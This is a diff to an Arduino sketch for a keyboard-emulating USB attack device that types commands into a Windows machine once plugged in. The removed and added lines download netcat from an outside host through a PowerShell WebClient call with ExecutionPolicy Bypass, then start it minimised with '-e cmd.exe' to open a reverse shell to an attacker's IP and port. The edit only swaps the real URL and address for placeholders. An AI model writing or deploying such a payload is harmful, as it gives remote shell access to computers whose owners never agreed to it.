@@ -5,7 +5,7 @@
 #include "Keyboard.h"
 
 void typeKey(int key)
-{  
+{
   Keyboard.press(key);
   delay(50);
   Keyboard.release(key);
@@ -14,10 +14,10 @@ void typeKey(int key)
 /* Init function */
 void setup()
 {
-  
-  // For VM
+
+  // For VMs. It some delay is needed to recognize the device by host then you have to add device to the guest
   delay(10000);
-  
+
   // Begining the Keyboard stream
   Keyboard.begin();
 
@@ -38,13 +38,13 @@ void setup()
 
   delay(500);
 
-  Keyboard.print("cd / & mkdir win & cd win & echo (new-object System.Net.WebClient).DownloadFile('https://vikas.guru/pwner/nc.exe','C:\\win\\a.exe') > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
+  Keyboard.print("cd / & mkdir win & cd win & echo (new-object System.Net.WebClient).DownloadFile('<LINK_TO_NC_EXE>','C:\\win\\a.exe') > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1");
 
   typeKey(KEY_RETURN);
 
   delay(500);
 
-  Keyboard.print("START /MIN a.exe 192.168.1.201 8055 -e cmd.exe -d & exit");
+  Keyboard.print("START /MIN a.exe IP PORT -e cmd.exe -d & exit");
 
   typeKey(KEY_RETURN);
 
